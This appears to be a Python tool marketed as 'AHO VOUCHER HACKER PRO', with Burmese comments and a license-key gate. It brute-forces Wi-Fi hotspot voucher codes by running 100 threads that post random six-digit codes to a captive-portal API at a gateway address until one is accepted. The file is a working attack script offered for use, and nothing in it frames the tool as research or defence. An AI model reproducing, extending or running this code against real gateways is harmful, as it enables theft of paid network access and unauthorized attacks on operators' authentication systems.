import sys, os, hashlib, subprocess, datetime, requests, time, threading, random, string
from colorama import Fore, init, Style

init(autoreset=True)

# --- LICENSE SYSTEM (အစ်ကို့ကုဒ်) ---
SALT = "AHO_PRO_FINAL_2026_SECURE"
KEY_FILE = os.path.expanduser("~/.aho_key_data")

def get_net_time():
    try:
        res = requests.get('http://worldtimeapi.org/api/timezone/Asia/Yangon', timeout=5)
        return datetime.datetime.strptime(res.json()['datetime'][:10], "%Y-%m-%d")
    except:
        return datetime.datetime.now()

def get_hwid():
    user = subprocess.check_output(['whoami']).decode().strip()
    return f"AHO-{hashlib.md5(user.encode()).hexdigest()[:6].upper()}"

def check_access():
    uid = get_hwid()
    now = get_net_time()
    saved_key = ""
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f:
            saved_key = f.read().strip()

    if saved_key:
        for i in range(0, 366):
            check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
            if saved_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
                print(f"{Fore.GREEN}[✔] AUTO-LOGIN SUCCESS! Valid until: {check_date}")
                return True

    print(f"{Fore.CYAN}--- AHO VOUCHER HACKER PRO ---")
    print(f"DEVICE ID: {Fore.YELLOW}{uid}")
    user_key = input("ENTER YOUR LICENSE KEY: ").strip()

    for i in range(0, 366):
        check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
        if user_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
            with open(KEY_FILE, "w") as f:
                f.write(user_key)
            print(f"{Fore.GREEN}[✔] KEY ACTIVATED! Valid until: {check_date}")
            return True
    return False

# --- VOUCHER HACK LOGIC (DIGIT ONLY) ---
_found = False
_tested = 0

def voucher_engine(host, slot):
    global _found, _tested
    sess = requests.Session()
    # အစ်ကို့ Direct Hack ကရတဲ့ Header မျိုးကို သုံးထားတယ်
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest"
    }
    url = f"http://{host}/api/auth/voucher/"

    while not _found:
        # Digit သီးသန့် ၆ လုံး (အစ်ကိုလိုချင်တဲ့ Digit hack)
        code = "".join(random.choice(string.digits) for _ in range(6))
        try:
            payload = {"accessCode": code, "authType": "voucher", "apiVersion": 1}
            res = sess.post(url, json=payload, headers=headers, timeout=5)
            _tested += 1
            
            if res.status_code == 200:
                data = res.json()
                if data.get('error') == 0 or data.get('success'):
                    _found = True
                    print(f"\n\n{Fore.GREEN}[✔] SUCCESS! VOUCHER FOUND: {Fore.WHITE}{code}")
                    os._exit(0)
        except: pass

def start_hack():
    os.system('clear')
    print(f"{Fore.CYAN}{Style.BRIGHT}=========================================")
    print(f"{Fore.GREEN}{Style.BRIGHT}    AHO VOUCHER INJECTOR - DIGIT MODE    ")
    print(f"{Fore.CYAN}{Style.BRIGHT}=========================================")
    
    # Gateway IP (အစ်ကို့ Direct Hack IP 10.10.10.1 သို့မဟုတ် 192.168.110.1)
    target = "10.10.10.1" 
    print(f"{Fore.YELLOW}[*] Targeting Gateway: {target}")
    print(f"{Fore.YELLOW}[*] Multi-Threading: 100 Threads Active")
    
    for i in range(100):
        threading.Thread(target=voucher_engine, args=(target, i), daemon=True).start()
    
    while not _found:
        sys.stdout.write(f"\r{Fore.RED}[☠] Tested: {Fore.WHITE}{_tested} {Fore.RED}codes...")
        sys.stdout.flush()
        time.sleep(0.1)

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    if check_access():
        print(f"{Fore.BLUE}[*] Access Granted. Starting Engine...")
        time.sleep(1)
        start_hack()
    else:
        print(f"{Fore.RED}[✘] INVALID KEY OR EXPIRED!")

